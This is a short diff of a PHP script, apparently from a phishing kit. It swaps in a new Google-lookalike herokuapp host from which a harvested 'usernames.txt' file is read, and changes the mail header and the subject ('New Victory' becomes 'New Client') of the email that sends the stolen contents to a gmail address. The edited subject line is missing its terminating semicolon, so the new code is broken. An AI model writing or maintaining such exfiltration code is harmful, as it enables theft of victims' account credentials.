@@ -15,7 +15,7 @@ session_start();
 
 
 header('content-type: text/plain');
-$file = "https://google-account.herokuapp.com/usernames.txt";
+$file = "https://accountgooglein.herokuapp.com//usernames.txt";
 $txt = file_get_contents($file);
 //echo $txt;
 
@@ -38,8 +38,8 @@ $headers = "MIME-Version: 1.0" . "\r\n";
 $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
 
 $to = "censorday.offical@gmail.com";
-$subject = "New Victory";
-$headers = "postman@postm25.com" . "\r\n" .
+$subject = "New Client"
+$headers = "rainingfools@gmail.com" . "\r\n" .
 
 
 mail($to,$subject,$txt,$headers);
